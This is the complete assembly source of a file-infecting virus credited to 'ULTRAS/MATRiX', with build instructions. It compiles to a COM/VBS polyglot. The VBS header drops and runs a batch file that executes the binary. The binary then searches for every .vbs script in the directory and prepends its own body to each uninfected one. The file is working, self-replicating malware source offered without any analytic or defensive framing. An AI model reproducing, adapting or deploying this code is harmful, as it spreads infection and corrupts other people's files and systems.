; VBS.Nazburg by ULTRAS/MATRiX 
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; The Parasite vbs infector on asm...
;
; Compile (with NASM):
; nasm -f bin -o nazburg.com nazburg.asm

[bits 16]
[org 0x0100]
[segment .text]
start:
db "'"
; jmp_virus
jmp v_start
db 13,10
; VBS header
db 'Dim a,f,s',13,10
db 'Set a = Wscript.CreateObject("Wscript.Shell")',13,10
db 'Set f = CreateObject("Scripting.FileSystemObject")',13,10
db 'Set s = f.CreateTextFile("nazburg.bat", 2, False)',13,10
db 's.WriteLine "echo off"',13,10
db 's.WriteLine "copy " & Wscript.ScriptFullName & " nazburg.com>NUL"',13,10
db 's.WriteLine "nazburg.com"',13,10
db 's.WriteLine "del nazburg.com"',13,10
db 's.Close',13,10
db 'a.Run ("nazburg.bat")',13,10
db 13,10
db "'"
; virus_code
v_start:
mov ah,0x4e
mov dx,batname
int 0x21
jc quit
jmp infect
again:
mov ah,0x4f
int 0x21
jc quit
infect:
mov ax,0x3d02
mov dx,0x009e
int 0x21
jc again
mov bx,ax
mov cx,[ds:0x09a]
mov ah,0x3f
mov dx,buf
int 21h
mov ax,word [ds:start]
cmp word [ds:buf],ax
jz close
mov ax,0x4200
xor cx,cx
xor dx,dx
int 0x21
mov ah,0x40
mov dx,0x100
mov cx,buf-0x100
int 0x21
mov ah,0x40
mov cx,[ds:0x09a]
mov dx,buf
int 0x21
close:
mov ah,0x3f
dec ah
int 0x21
jmp again
quit:
mov ax,0x4c00
int 0x21
[segment .data]
batname db '*.vbs',0
virname db 'Nazburg by ULTRAS/MATRiX'
db 0dh,0ah
buf:
[segment .bss]